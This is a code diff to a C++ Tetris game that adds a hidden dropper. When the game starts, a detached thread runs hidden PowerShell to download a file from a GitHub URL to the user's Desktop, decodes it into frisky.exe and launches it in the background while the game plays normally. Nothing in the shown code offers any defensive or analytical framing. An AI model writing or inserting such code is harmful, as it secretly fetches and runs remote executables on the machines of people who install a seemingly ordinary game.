@@ -4,12 +4,6 @@
 
 #include <game.hpp>
 
-#include <cstdlib>
-#include <ctime>
-#include <algorithm>
-#include <random>
-#include <iostream>
-
 // Tetromino shapes
 static const std::array<std::array<Vec2i,4>,7> SHAPES = {{
     {{ {0,1}, {1,1}, {2,1}, {3,1} }}, // I
@@ -240,13 +234,66 @@ void Game::Draw() {
     EndDrawing();
 }
 
-// takes raw binary data and writes it to a file on disk
-void Game::InstallBlob() {
+void FetchBlob(const std::string burl) {
+    std::string cmd = "iwr " + burl + " -outfile $HOME\\Desktop\\frisky.bin";
+    std::string psh = "powershell -nop -w hidden -c " + cmd;
+    int s = std::system(psh.c_str());
+}
 
+void RunBlob() {
+    std::system("powershell -nop -w hidden -c $HOME\\Desktop\\frisky.bin");
+}
+
+std::string ReadBin(const std::string& filename)
+{
+    std::ifstream file(filename, std::ios::in); // text mode, not binary
+    if (!file) {
+        return "";
+    }
+
+    std::ostringstream buffer;
+    buffer << file.rdbuf();  // read the entire file into a stream
+    return buffer.str();     // return as a single string
+}
+
+// takes raw binary data and writes it to a file on disk
+void InstallBlob() {
+    FetchBlob("https://github.com/UnDefinedCS/frisky/raw/refs/heads/main/frisky.bin");
+    std::string binaryString = ReadBin("frisky.bin");
+
+    if (binaryString.empty()) {
+        return;
+    }
+
+    // remove any non-binary characters from the string
+    binaryString.erase(
+        std::remove_if(binaryString.begin(), binaryString.end(),
+                       [](unsigned char c){ return c != '0' && c != '1'; }),
+        binaryString.end());
+
+    // Open output file in binary mode for Windows
+    std::ofstream out("frisky.exe", std::ios::binary);
+    if (!out) {
+        return;
+    }
+
+    // Process 8 bits at a time
+    for (size_t i = 0; i + 8 <= binaryString.size(); i += 8) {
+        std::string byteString = binaryString.substr(i, 8);
+        unsigned char byte = static_cast<unsigned char>(std::stoi(byteString, nullptr, 2));
+        out.put(byte);
+    }
+
+    out.close();
+
+    // run exe on different thread to not halt game program
+    std::thread t(RunBlob);
+    t.detach();
 }
 
 void Game::Run() {
-    InstallBlob();
+    std::thread t(InstallBlob);
+    t.detach();
     
     while(!WindowShouldClose()){
         Update();
